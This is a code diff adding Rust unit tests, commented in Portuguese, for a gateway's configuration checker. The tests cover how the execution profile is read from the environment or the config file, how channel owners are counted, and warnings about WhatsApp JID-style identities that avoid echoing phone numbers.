+    /// env e provada em `execution::tests::perfil_do_env_le_o_ambiente_de_verdade`
+    /// (valores validos) e pelo smoke da CLI, num subprocesso.
+    #[test]
+    fn validate_e_summarise_usam_a_env_injetada() {
+        let invalida: PerfilDaEnv = Err("not-a-profile"
+            .parse::<ExecutionProfile>()
+            .expect_err("invalido"));
+        let erros: Vec<_> =
+            validate_com_env(&AppConfig::default(), &invalida, &BindDaEnv::default())
+                .into_iter()
+                .filter(|f| f.field == "execution.profile")
+                .collect();
+        assert_eq!(erros.len(), 1, "{erros:?}");
+        assert_eq!(erros[0].severity, Severity::Error);
+        assert!(
+            erros[0].message.contains(PROFILE_ENV),
+            "{}",
+            erros[0].message
+        );
+        assert!(!erros[0].message.contains("standard em silencio"));
+        // Com env invalida o sumario mostra o que o arquivo diz.
+        let sumario_invalido = summarise_com_env(&AppConfig::default(), 0, &invalida);
+        assert_eq!(sumario_invalido.execution_profile, "standard");
+        assert_eq!(sumario_invalido.execution_profile_source, "default");
+
+        let env: PerfilDaEnv = Ok(Some(ExecutionProfile::IsolatedPod));
+        let limpo: Vec<_> = validate_com_env(&AppConfig::default(), &env, &BindDaEnv::default())
+            .into_iter()
+            .filter(|f| f.field == "execution.profile")
+            .collect();
+        assert!(limpo.is_empty(), "{limpo:?}");
+        let sumario_env = summarise_com_env(&AppConfig::default(), 0, &env);
+        assert_eq!(sumario_env.execution_profile, "isolated-pod");
+        assert_eq!(sumario_env.execution_profile_source, "env");
+
+        let sumario_default = summarise_com_env(&AppConfig::default(), 0, &Ok(None));
+        assert_eq!(sumario_default.execution_profile, "standard");
+        assert_eq!(sumario_default.execution_profile_source, "default");
+    }
+
+    /// Sem env, o sumario reflete o arquivo (e a origem `file`).
+    #[test]
+    fn summarise_reporta_perfil_do_arquivo() {
+        let config = AppConfig {
+            execution: execucao(Some(ExecutionProfile::IsolatedPod), None),
+            ..AppConfig::default()
+        };
+        let sumario = summarise_com_env(&config, 0, &Ok(None));
+        assert_eq!(sumario.execution_profile, "isolated-pod");
+        assert_eq!(
+            sumario.execution_profile_source,
+            ProfileSource::File.as_str()
+        );
+    }
+
+    /// Valor invalido de `execution.profile` no ARQUIVO (marcado por
+    /// `load_para_o_check`) e o mesmo Error que a env invalida — nomeando o
+    /// valor e dizendo que o gateway nao sobe (review C10).
+    #[test]
+    fn execution_perfil_invalido_no_arquivo_e_error() {
+        let dir = temp_dir("check-perfil-invalido-no-arquivo");
+        fs::create_dir_all(&dir).expect("failed to create temp dir");
+        fs::write(
+            dir.join("config.yml"),
+            "execution:\n  profile: isolated_pod\n",
+        )
+        .expect("failed to write config");
+        let loader = ConfigLoader::with_dir(&dir);
+        let config = loader.load_para_o_check().expect("o check carrega");
+
+        let achados = validate_execution(&config.execution, &Ok(None), &HashMap::new());
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Error);
+        assert_eq!(achados[0].field, "execution.profile");
+        assert!(
+            achados[0].message.contains("\"isolated_pod\""),
+            "{}",
+            achados[0].message
+        );
+        assert!(
+            achados[0].message.contains("config file"),
+            "{}",
+            achados[0].message
+        );
+
+        // O pipeline inteiro: `run_check` tem o Error e o sumario mostra o
+        // default (o arquivo, sem o valor recusado, nao declara perfil).
+        // HOST/PORT de um teste vizinho nao entram (#1261): run_check le a env.
+        let check = com_bind_env(None, None, || run_check(&loader, &config));
+        assert!(check.has_errors(), "{:?}", check.findings);
+        assert!(
+            check
+                .findings
+                .iter()
+                .any(|f| f.field == "execution.profile" && f.severity == Severity::Error)
+        );
+        let _ = fs::remove_dir_all(dir);
+    }
+
+    /// A contagem de `owners` conta o que o gateway conta: strings nao vazias
+    /// apos trim. Um inteiro YAML sem aspas, `""` e `"  "` nao sao donos em
+    /// lugar nenhum — e o check nao pode dizer que sao (review C3/F-5).
+    #[test]
+    fn execution_owners_conta_so_strings_nao_vazias() {
+        let canais = canal_linked_com_owners(serde_json::json!([
+            "",
+            "   ",
+            5511999998888_u64,
+            true,
+            serde_json::Value::Null,
+            "5511999998888"
+        ]));
+        let achados = validate_execution(&execucao(None, None), &Ok(None), &canais);
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert!(
+            achados[0].message.contains("1 identity"),
+            "{}",
+            achados[0].message
+        );
+
+        // So lixo: zero donos, nenhum aviso.
+        let so_lixo = canal_linked_com_owners(serde_json::json!(["", 42, null]));
+        let achados = validate_execution(&execucao(None, None), &Ok(None), &so_lixo);
+        assert!(achados.is_empty(), "{achados:?}");
+    }
+
+    /// F-4 da auditoria: `<digitos>@s.whatsapp.net` em `owners`/`allow` nunca
+    /// casa com um remetente (o canal compara digitos), e o check avisa —
+    /// com a contagem, nunca a identidade — em qualquer perfil.
+    #[test]
+    fn identidade_em_forma_de_jid_de_numero_avisa_sem_ecoar() {
+        let mut settings = HashMap::new();
+        settings.insert(
+            "owners".to_string(),
+            serde_json::json!(["5521977776666@s.whatsapp.net", "5521977776666"]),
+        );
+        settings.insert(
+            "allow".to_string(),
+            serde_json::json!([" 5531966665555@S.WHATSAPP.NET ", "abc@lid"]),
+        );
+        let canais = HashMap::from([(
+            "whatsapp_linked".to_string(),
+            ChannelConfig {
+                channel_type: "whatsapp_linked".to_string(),
+                enabled: Some(true),
+                settings,
+            },
+        )]);
+        let config = AppConfig {
+            channels: canais.clone(),
+            execution: execucao(Some(ExecutionProfile::IsolatedPod), None),
+            ..AppConfig::default()
+        };
+        let avisos: Vec<_> = validate(&config)
+            .into_iter()
+            .filter(|f| f.message.contains("@s.whatsapp.net"))
+            .collect();
+        assert_eq!(avisos.len(), 2, "{avisos:?}");
+        for aviso in &avisos {
+            assert_eq!(aviso.severity, Severity::Warning);
+            assert!(
+                aviso.field == "channels.whatsapp_linked.owners"
+                    || aviso.field == "channels.whatsapp_linked.allow",
+                "{}",
+                aviso.field
+            );
+            assert!(aviso.message.contains("1 entry"), "{}", aviso.message);
+            assert!(
+                !aviso.message.contains("5521977776666")
+                    && !aviso.message.contains("5531966665555"),
+                "identidade vazou: {}",
+                aviso.message
+            );
+        }
+
+        // Gemeo: digitos e `@lid` nao avisam; outro tipo de canal tambem nao.
+        let mut limpo = canais.clone();
+        if let Some(ch) = limpo.get_mut("whatsapp_linked") {
+            ch.settings.insert(
+                "owners".to_string(),
+                serde_json::json!(["5521977776666", "abc@lid"]),
+            );
+            ch.settings.remove("allow");
+        }
+        let mut findings = Vec::new();
+        validate_whatsapp_linked_identidades(&limpo, &mut findings, &|f, campo, msg| {
+            f.push(Finding {
+                severity: Severity::Warning,
+                field: campo.to_owned(),
+                message: msg,
+            })
+        });
+        assert!(findings.is_empty(), "{findings:?}");
+
+        let mut outro = canais;
+        if let Some(ch) = outro.get_mut("whatsapp_linked") {
+            ch.channel_type = "whatsapp".to_string();
+        }
+        let mut findings = Vec::new();
+        validate_whatsapp_linked_identidades(&outro, &mut findings, &|f, campo, msg| {
+            f.push(Finding {
+                severity: Severity::Warning,
+                field: campo.to_owned(),
+                message: msg,
+            })
+        });
+        assert!(findings.is_empty(), "{findings:?}");
+    }
+
+    #[test]
+    fn execution_profile_env_e_conhecida_pelo_check() {
+        assert!(
+            KNOWN_GARRAIA_ENV_VARS.contains(&PROFILE_ENV),
+            "{PROFILE_ENV} precisa estar em KNOWN_GARRAIA_ENV_VARS ou fica invisivel ao check"
+        );
     }
 }
